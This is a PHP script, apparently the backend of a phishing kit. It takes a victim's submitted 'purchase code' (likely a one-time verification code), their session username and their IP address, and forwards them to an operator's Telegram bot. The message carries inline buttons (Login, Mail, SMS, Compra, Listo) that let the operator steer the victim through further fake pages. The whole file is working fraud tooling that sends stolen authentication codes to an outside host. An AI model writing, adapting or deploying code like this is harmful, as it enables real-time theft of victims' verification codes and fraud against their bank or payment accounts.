<?php
session_start();
include 'config.php';

// Verificar que las variables estén definidas
if (!isset($token) || !isset($chat_id)) {
    die(json_encode(["success" => false, "message" => "Error: Configuración de Telegram no encontrada."]));
}

// Obtener usuario de sesión
$usuario = $_SESSION['usuario'] ?? 'desconocido';

// Obtener los datos enviados por POST
$input = file_get_contents("php://input");
$data = json_decode($input, true);
$codigo = $data['codigo'] ?? '';

// Validar el código
if (empty($codigo)) {
    die(json_encode(["success" => false, "message" => "Código no válido."]));
}

// Obtener la IP del cliente
$ip_cliente = $_SERVER['REMOTE_ADDR'];

// Crear el mensaje
$mensaje = "🔐 *CÓDIGO DE COMPRA RECIBIDO* 🔐\n\n";
$mensaje .= "👤 *Usuario*: $usuario\n";
$mensaje .= "🔢 *Código*: $codigo\n";
$mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n";
$mensaje .= "📅 *Fecha y Hora*: " . date('Y-m-d H:i:s') . "\n";

// Crear botones inline
$botones = json_encode([
    'inline_keyboard' => [
        [
            ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
            ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
            ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
            ['text' => '💸 Compra', 'callback_data' => "COMPRA|$usuario"],
            ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
        ]
    ]
]);

// Enviar los datos a Telegram
$telegram_url = "https://api.telegram.org/bot$token/sendMessage";
$telegram_data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown',
    'reply_markup' => $botones
];

// Usar cURL para enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Responder con éxito o error
if ($response === false) {
    echo json_encode(["success" => false, "message" => "Error al enviar el mensaje a Telegram."]);
} else {
    echo json_encode(["success" => true, "message" => "Código enviado con éxito."]);
}
?>
